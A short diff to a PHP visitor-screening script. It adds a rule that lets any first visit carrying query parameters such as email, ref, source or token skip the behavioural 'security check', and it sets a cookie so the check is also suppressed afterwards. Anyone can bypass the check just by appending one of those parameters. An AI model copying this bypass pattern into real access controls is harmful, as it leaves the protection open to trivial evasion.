@@ -2762,8 +2762,21 @@ file_put_contents($LOG_FILE, $log_line, FILE_APPEND);
 // Check if this is first visit (no analysis done yet)
 $is_first_visit = !isset($_COOKIE['js_verified']) && !isset($_COOKIE['fp_hash']) && !isset($_COOKIE['analysis_done']);
 
+// Check if URL has application parameters that need immediate processing
+// Skip security check for these to allow application logic to run (e.g., ?email= to ?sid= transformation)
+$has_app_params = isset($_GET['email']) || isset($_GET['uid']) || isset($_GET['ref']) || isset($_GET['source']) || isset($_GET['token']) || isset($_GET['code']);
+
+// If first visit WITH app parameters, skip security check and let application process them first
+if ($is_first_visit && $has_app_params) {
+    // Set the analysis_done cookie to prevent security check on next request
+    setcookie('analysis_done', 'yes', time() + 86400, '/');
+    // Don't show security check - continue to application code immediately
+    // Behavioral analysis will run on subsequent requests
+    $is_first_visit = false; // Bypass the security check page
+}
+
 if ($is_first_visit) {
-    // First visit: Show analysis page to collect behavioral data
+    // First visit WITHOUT app params: Show analysis page to collect behavioral data
     // Set cookie WITHOUT httponly so JavaScript can verify it was set
     setcookie('analysis_done', 'yes', time() + 86400, '/');
     ?>
